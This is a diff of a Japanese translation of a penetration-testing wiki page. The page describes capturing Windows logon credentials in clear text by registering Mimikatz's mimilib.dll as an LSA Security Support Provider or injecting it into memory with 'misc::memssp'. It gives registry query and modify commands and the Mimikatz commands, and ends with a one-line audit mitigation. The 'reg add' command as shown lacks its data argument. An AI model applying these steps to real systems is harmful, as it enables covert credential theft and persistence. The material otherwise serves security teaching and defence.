@@ -4,37 +4,37 @@
 
 ### Custom SSP
 
-[SSP（セキュリティサポートプロバイダー）についてはこちらで学んでください。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
-自分の**SSP**を作成して、マシンにアクセスするために使用される**資格情報**を**平文**で**キャプチャ**できます。
+[SSP（Security Support Provider）についてはこちらで説明しています。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
+独自の **SSP** を作成して、マシンへのアクセスに使用された **credentials** を **clear text** で **capture** できます。
 
 #### Mimilib
 
-Mimikatzが提供する`mimilib.dll`バイナリを使用できます。**これにより、すべての資格情報が平文でファイルに記録されます。**\
-dllを`C:\Windows\System32\`に配置します。\
-既存のLSAセキュリティパッケージのリストを取得します：
+Mimikatz が提供する `mimilib.dll` バイナリを使用できます。**このバイナリは、すべての credentials を clear text でファイル内に記録します。**\
+DLL を `C:\Windows\System32\` に配置します。\
+既存の LSA Security Packages の一覧を取得します：
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-`mimilib.dll`をセキュリティサポートプロバイダーリスト（セキュリティパッケージ）に追加します：
+Security Support Provider リスト（Security Packages）に `mimilib.dll` を追加します：
 ```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
-再起動後、すべての資格情報は `C:\Windows\System32\kiwissp.log` に平文で見つけることができます。
+そして再起動後、すべての認証情報が `C:\Windows\System32\kiwissp.log` に平文で保存されます。
 
-#### メモリ内
+#### メモリ上
 
-Mimikatzを使用して、これをメモリ内に直接注入することもできます（少し不安定で動作しない可能性があることに注意してください）：
+Mimikatz を使用して、これをメモリに直接 inject することもできます（少し不安定で、動作しない場合があることに注意してください）。
 ```bash
 privilege::debug
 misc::memssp
 ```
-この変更は再起動後に持続しません。
+これは再起動後も維持されません。
 
 #### 緩和策
 
-イベント ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` の監査作成/変更
+Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` の作成/変更を監査
 
 {{#include ../../banners/hacktricks-training.md}}
